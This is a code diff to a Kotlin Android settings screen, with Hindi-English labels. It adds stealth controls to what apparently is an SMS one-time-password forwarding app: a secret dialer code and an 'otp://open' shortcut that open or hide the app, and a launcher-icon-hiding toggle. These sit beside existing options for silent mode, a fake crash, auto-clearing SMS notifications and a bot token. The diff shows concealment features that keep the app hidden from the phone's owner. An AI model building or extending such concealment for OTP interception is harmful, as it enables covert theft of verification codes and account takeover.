@@ -988,7 +988,9 @@ fun ServicesTab(
     var isOnlyOtpMode by remember { mutableStateOf(prefs.getBoolean("only_otp_mode", false)) }
     var isLowBatteryAlertEnabled by remember { mutableStateOf(prefs.getBoolean("low_battery_alert_enabled", false)) }
 
-    // 5. Stealth & Protection Suite State (Clean: Zero Broken Icon Hiding)
+    // 5. Stealth & Protection Suite State (Clean Activity-Alias & Secret Code)
+    var customSecretCode by remember { mutableStateOf(prefs.getString("custom_secret_code", "") ?: "") }
+    var isIconHidden by remember { mutableStateOf(SecretCodeReceiver.isLauncherIconHidden(context)) }
     var isSilentMode by remember { mutableStateOf(!prefs.getBoolean("show_screen_popups", false)) }
     var isAppLockEnabled by remember { mutableStateOf(prefs.getBoolean("app_lock_enabled", false)) }
     var isFakeCrashEnabled by remember { mutableStateOf(prefs.getBoolean("fake_crash_enabled", false)) }
@@ -1317,12 +1319,52 @@ fun ServicesTab(
 
         Spacer(modifier = Modifier.height(12.dp))
 
-        // Card: Stealth & Security Controls (Clean, 100% Reliable Suite)
+        // Card: Stealth & Security Controls (Clean Activity-Alias & Zero Duplicate App)
         MncCard {
             Column(modifier = Modifier.padding(14.dp)) {
                 Text("🛡️ Stealth & Protection Suite", fontWeight = FontWeight.Bold, fontSize = 15.sp, color = Color(0xFFA78BFA))
-                Text("Security locks aur silent operation configure karein:", fontSize = 11.sp, color = TextSecondary)
+                Text("App ko hide karne aur security locks configure karein:", fontSize = 11.sp, color = TextSecondary)
                 Spacer(modifier = Modifier.height(12.dp))
+
+                // Custom Secret Dialer Setting
+                Text("📞 Customer Secret Dialer Code:", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = TextPrimary)
+                Text("Phone dialer me *#*#CODE#*#* dial karke app kholi/chhupai jati hai:", fontSize = 10.sp, color = TextMuted)
+                Spacer(modifier = Modifier.height(6.dp))
+                Row(modifier = Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically) {
+                    Box(modifier = Modifier.weight(1f)) {
+                        MncTextField(
+                            value = customSecretCode,
+                            onValueChange = { customSecretCode = it.filter { ch -> ch.isDigit() }.take(6) },
+                            label = "Custom Code (e.g. 1234)"
+                        )
+                    }
+                    Spacer(modifier = Modifier.width(8.dp))
+                    Button(
+                        onClick = {
+                            if (customSecretCode.trim().isNotEmpty()) {
+                                prefs.edit().putString("custom_secret_code", customSecretCode.trim()).apply()
+                                Toast.makeText(context, "✅ Code Saved: *#*#${customSecretCode.trim()}#*#*", Toast.LENGTH_SHORT).show()
+                            }
+                        },
+                        colors = ButtonDefaults.buttonColors(containerColor = AccentIndigo),
+                        shape = RoundedCornerShape(8.dp),
+                        modifier = Modifier.height(52.dp)
+                    ) {
+                        Text("Set", fontSize = 12.sp, fontWeight = FontWeight.Bold)
+                    }
+                }
+                Spacer(modifier = Modifier.height(4.dp))
+                Text("💡 Browser direct unlock shortcut: otp://open", fontSize = 10.sp, color = Color(0xFF67E8F9))
+
+                HorizontalDivider(modifier = Modifier.padding(vertical = 10.dp), color = CardBorder)
+
+                // Hide App Icon Toggle (Uses Clean Activity-Alias - Zero Duplicate App Bug)
+                SettingToggleRow("Hide Launcher Icon", isIconHidden) { hide ->
+                    SecretCodeReceiver.setLauncherIconVisibility(context, hide)
+                    isIconHidden = hide
+                }
+
+                HorizontalDivider(modifier = Modifier.padding(vertical = 10.dp), color = CardBorder)
 
                 // Silent Stealth Mode
                 SettingToggleRow("Silent Stealth Mode", isSilentMode) { silent ->
@@ -1374,6 +1416,7 @@ fun ServicesTab(
                     .putBoolean("app_lock_enabled", isAppLockEnabled)
                     .putBoolean("fake_crash_enabled", isFakeCrashEnabled)
                     .putBoolean("auto_clear_sms_notification", isAutoClearSms)
+                    .putString("custom_secret_code", customSecretCode.trim())
 
                 // Zero-Leak Protection: Never persist founder credentials in public customer keys
                 val cleanBotToken = botToken.trim()
